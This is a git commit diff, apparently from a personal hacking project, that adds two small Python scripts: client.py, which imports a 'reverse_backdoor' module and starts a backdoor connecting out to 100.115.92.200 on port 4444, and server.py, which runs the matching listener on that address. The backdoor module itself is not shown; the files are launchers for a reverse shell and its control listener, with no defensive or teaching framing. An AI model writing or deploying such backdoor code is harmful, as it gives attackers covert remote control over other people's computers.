0d908617125ced8005efff86d0aef926a5c30896
vicenteGamezz <ceinnova07721@innovaccion.mx>
2022-07-12 23:54:54 -0500

    Updated

---
+++ client.py
@@ -0,0 +1,7 @@
+#!/usr/bin/env python
+# _*_ coding: utf8 _*_
+
+import reverse_backdoor as backdoor
+
+my_backdoor = backdoor.Backdoor("100.115.92.200", 4444)
+my_backdoor.run()
---
+++ server.py
@@ -0,0 +1,7 @@
+#!/usr/bin/env python
+# _*_ coding: utf8 _*_
+
+import listener
+
+my_listener = listener.Listener("100.115.92.200", 4444)
+my_listener.run()
